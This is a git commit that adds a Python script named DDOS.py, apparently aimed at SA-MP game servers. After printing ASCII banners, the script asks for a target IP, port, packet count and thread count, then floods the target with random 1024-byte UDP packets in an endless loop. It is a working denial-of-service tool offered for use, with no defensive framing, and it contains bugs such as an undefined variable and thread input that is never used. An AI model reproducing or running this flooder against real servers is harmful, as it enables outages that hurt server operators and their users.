64e0779037e485e269cc38d0c01cf4b83f34e2c0
YOUSSEF X <99427320+youssefchaouiHhhhh@users.noreply.github.com>
2022-12-26 19:16:08 +0100

    Add files via upload
    DDOS Via samp

---
+++ DDOS.py
@@ -0,0 +1,59 @@
+import random
+import socket
+import threading
+import platform
+
+print("DDoS is Running in : "+platform.system())
+
+if platform.system() == 'Windows':
+
+	print("""
+ is Presenting to you :
+
+
+██████╗░██████╗░░█████╗░░██████╗
+██╔══██╗██╔══██╗██╔══██╗██╔════╝
+██║░░██║██║░░██║██║░░██║╚█████╗░
+██║░░██║██║░░██║██║░░██║░╚═══██╗
+██████╔╝██████╔╝╚█████╔╝██████╔╝
+╚═════╝░╚═════╝░░╚════╝░╚═════╝░
+
+Loaded
+
+	""")
+else :
+	print("""
+ is Presenting to you :
+
+
+┏━━━┳━━━┓╋╋┏━━━┓
+┗┓┏┓┣┓┏┓┃╋╋┃┏━┓┃
+╋┃┃┃┃┃┃┃┣━━┫┗━━┓
+╋┃┃┃┃┃┃┃┃┏┓┣━━┓┃
+┏┛┗┛┣┛┗┛┃┗┛┃┗━┛┃
+┗━━━┻━━━┻━━┻━━━┛
+┏━━━┓┏┓╋┏┓╋╋╋╋╋╋┏┓
+┃┏━┓┣┛┗┳┛┗┓╋╋╋╋╋┃┃
+┃┃╋┃┣┓┏┻┓┏╋━━┳━━┫┃┏┓
+┃┗━┛┃┃┃╋┃┃┃┏┓┃┏━┫┗┛┛
+┃┏━┓┃┃┗┓┃┗┫┏┓┃┗━┫┏┓┓
+┗┛╋┗┛┗━┛┗━┻┛┗┻━━┻┛┗┛
+		""")
+
+
+print("DDos")
+ip= str(input("                   IP: "))
+port= int(input("                   PORT:"))
+times= int(input("                   PAKET:"))
+threads= int(input("                    threads:"))
+def run():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"Paket Sending <<<<")
+		except:
+			print("[!] SERVER DOWN!!!")
